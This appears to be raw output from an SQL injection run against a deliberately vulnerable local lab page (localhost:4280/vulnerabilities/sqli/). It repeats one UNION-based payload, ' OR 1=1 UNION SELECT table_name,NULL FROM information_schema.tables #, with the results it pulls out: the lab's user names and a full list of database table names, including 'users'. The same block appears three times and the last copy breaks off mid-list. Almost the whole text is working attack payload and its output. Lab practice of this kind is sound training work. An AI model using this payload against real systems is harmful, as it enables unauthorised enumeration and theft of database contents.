Database: mysql
URL: http://localhost:4280/vulnerabilities/sqli/
Payload: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
Input: id
--- Extracted Results ---
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: admin
Surname: admin
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: Gordon
Surname: Brown
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: Hack
Surname: Me
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: Pablo
Surname: Picasso
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: Bob
Surname: Smith
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: ALL_PLUGINS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: APPLICABLE_ROLES
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: CHARACTER_SETS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: CHECK_CONSTRAINTS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: COLLATIONS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: COLLATION_CHARACTER_SET_APPLICABILITY
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: COLUMNS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: COLUMN_PRIVILEGES
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: ENABLED_ROLES
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: ENGINES
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: EVENTS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: FILES
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: GLOBAL_STATUS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: GLOBAL_VARIABLES
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: KEYWORDS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: KEY_CACHES
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: KEY_COLUMN_USAGE
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: OPTIMIZER_TRACE
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: PARAMETERS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: PARTITIONS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: PLUGINS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: PROCESSLIST
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: PROFILING
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: REFERENTIAL_CONSTRAINTS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: ROUTINES
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: SCHEMATA
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: SCHEMA_PRIVILEGES
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: SESSION_STATUS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: SESSION_VARIABLES
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: STATISTICS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: SQL_FUNCTIONS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: SYSTEM_VARIABLES
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: TABLES
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: TABLESPACES
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: TABLE_CONSTRAINTS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: TABLE_PRIVILEGES
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: TRIGGERS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: USER_PRIVILEGES
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: VIEWS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: CLIENT_STATISTICS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: INDEX_STATISTICS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: INNODB_FT_CONFIG
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: GEOMETRY_COLUMNS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: INNODB_SYS_TABLESTATS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: SPATIAL_REF_SYS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: USER_STATISTICS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: INNODB_TRX
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: INNODB_CMP_PER_INDEX
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: INNODB_METRICS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: INNODB_FT_DELETED
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: INNODB_CMP
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: THREAD_POOL_WAITS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: INNODB_CMP_RESET
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: THREAD_POOL_QUEUES
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: TABLE_STATISTICS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: INNODB_SYS_FIELDS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: INNODB_BUFFER_PAGE_LRU
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: INNODB_LOCKS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: INNODB_FT_INDEX_TABLE
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: INNODB_CMPMEM
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: THREAD_POOL_GROUPS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: INNODB_CMP_PER_INDEX_RESET
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: INNODB_SYS_FOREIGN_COLS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: INNODB_FT_INDEX_CACHE
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: INNODB_BUFFER_POOL_STATS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: INNODB_FT_BEING_DELETED
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: INNODB_SYS_FOREIGN
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: INNODB_CMPMEM_RESET
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: INNODB_FT_DEFAULT_STOPWORD
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: INNODB_SYS_TABLES
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: INNODB_SYS_COLUMNS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: INNODB_SYS_TABLESPACES
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: INNODB_SYS_INDEXES
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: INNODB_BUFFER_PAGE
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: INNODB_SYS_VIRTUAL
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: user_variables
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: INNODB_TABLESPACES_ENCRYPTION
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: INNODB_LOCK_WAITS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: THREAD_POOL_STATS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: users
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: guestbook
Surname: 
--- End of Extracted Results ---

Database: mysql
URL: http://localhost:4280/vulnerabilities/sqli/
Payload: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
Input: id
--- Extracted Results ---
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: admin
Surname: admin
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: Gordon
Surname: Brown
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: Hack
Surname: Me
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: Pablo
Surname: Picasso
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: Bob
Surname: Smith
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: ALL_PLUGINS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: APPLICABLE_ROLES
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: CHARACTER_SETS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: CHECK_CONSTRAINTS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: COLLATIONS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: COLLATION_CHARACTER_SET_APPLICABILITY
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: COLUMNS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: COLUMN_PRIVILEGES
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: ENABLED_ROLES
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: ENGINES
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: EVENTS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: FILES
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: GLOBAL_STATUS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: GLOBAL_VARIABLES
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: KEYWORDS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: KEY_CACHES
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: KEY_COLUMN_USAGE
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: OPTIMIZER_TRACE
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: PARAMETERS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: PARTITIONS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: PLUGINS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: PROCESSLIST
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: PROFILING
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: REFERENTIAL_CONSTRAINTS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: ROUTINES
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: SCHEMATA
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: SCHEMA_PRIVILEGES
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: SESSION_STATUS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: SESSION_VARIABLES
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: STATISTICS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: SQL_FUNCTIONS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: SYSTEM_VARIABLES
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: TABLES
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: TABLESPACES
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: TABLE_CONSTRAINTS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: TABLE_PRIVILEGES
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: TRIGGERS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: USER_PRIVILEGES
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: VIEWS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: CLIENT_STATISTICS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: INDEX_STATISTICS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: INNODB_FT_CONFIG
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: GEOMETRY_COLUMNS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: INNODB_SYS_TABLESTATS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: SPATIAL_REF_SYS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: USER_STATISTICS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: INNODB_TRX
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: INNODB_CMP_PER_INDEX
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: INNODB_METRICS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: INNODB_FT_DELETED
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: INNODB_CMP
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: THREAD_POOL_WAITS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: INNODB_CMP_RESET
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: THREAD_POOL_QUEUES
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: TABLE_STATISTICS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: INNODB_SYS_FIELDS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: INNODB_BUFFER_PAGE_LRU
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: INNODB_LOCKS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: INNODB_FT_INDEX_TABLE
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: INNODB_CMPMEM
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: THREAD_POOL_GROUPS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: INNODB_CMP_PER_INDEX_RESET
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: INNODB_SYS_FOREIGN_COLS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: INNODB_FT_INDEX_CACHE
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: INNODB_BUFFER_POOL_STATS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: INNODB_FT_BEING_DELETED
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: INNODB_SYS_FOREIGN
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: INNODB_CMPMEM_RESET
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: INNODB_FT_DEFAULT_STOPWORD
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: INNODB_SYS_TABLES
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: INNODB_SYS_COLUMNS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: INNODB_SYS_TABLESPACES
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: INNODB_SYS_INDEXES
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: INNODB_BUFFER_PAGE
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: INNODB_SYS_VIRTUAL
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: user_variables
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: INNODB_TABLESPACES_ENCRYPTION
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: INNODB_LOCK_WAITS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: THREAD_POOL_STATS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: users
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: guestbook
Surname: 
--- End of Extracted Results ---

Database: mysql
URL: http://localhost:4280/vulnerabilities/sqli/
Payload: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
Input: id
--- Extracted Results ---
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: admin
Surname: admin
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: Gordon
Surname: Brown
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: Hack
Surname: Me
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: Pablo
Surname: Picasso
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: Bob
Surname: Smith
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: ALL_PLUGINS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: APPLICABLE_ROLES
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: CHARACTER_SETS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: CHECK_CONSTRAINTS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: COLLATIONS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: COLLATION_CHARACTER_SET_APPLICABILITY
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: COLUMNS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: COLUMN_PRIVILEGES
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: ENABLED_ROLES
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: ENGINES
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: EVENTS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: FILES
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: GLOBAL_STATUS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: GLOBAL_VARIABLES
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: KEYWORDS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: KEY_CACHES
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: KEY_COLUMN_USAGE
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: OPTIMIZER_TRACE
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: PARAMETERS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: PARTITIONS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: PLUGINS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: PROCESSLIST
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: PROFILING
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: REFERENTIAL_CONSTRAINTS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: ROUTINES
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: SCHEMATA
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: SCHEMA_PRIVILEGES
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: SESSION_STATUS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: SESSION_VARIABLES
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: STATISTICS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: SQL_FUNCTIONS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: SYSTEM_VARIABLES
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: TABLES
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: TABLESPACES
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: TABLE_CONSTRAINTS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: TABLE_PRIVILEGES
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: TRIGGERS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: USER_PRIVILEGES
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: VIEWS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: CLIENT_STATISTICS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: INDEX_STATISTICS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: INNODB_FT_CONFIG
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: GEOMETRY_COLUMNS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: INNODB_SYS_TABLESTATS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: SPATIAL_REF_SYS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: USER_STATISTICS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: INNODB_TRX
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: INNODB_CMP_PER_INDEX
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: INNODB_METRICS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: INNODB_FT_DELETED
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: INNODB_CMP
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: THREAD_POOL_WAITS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: INNODB_CMP_RESET
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: THREAD_POOL_QUEUES
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: TABLE_STATISTICS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: INNODB_SYS_FIELDS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: INNODB_BUFFER_PAGE_LRU
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: INNODB_LOCKS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: INNODB_FT_INDEX_TABLE
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: INNODB_CMPMEM
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: THREAD_POOL_GROUPS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: INNODB_CMP_PER_INDEX_RESET
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: INNODB_SYS_FOREIGN_COLS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: INNODB_FT_INDEX_CACHE
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: INNODB_BUFFER_POOL_STATS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: INNODB_FT_BEING_DELETED
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: INNODB_SYS_FOREIGN
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: INNODB_CMPMEM_RESET
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: INNODB_FT_DEFAULT_STOPWORD
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: INNODB_SYS_TABLES
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: INNODB_SYS_COLUMNS
Surname: 
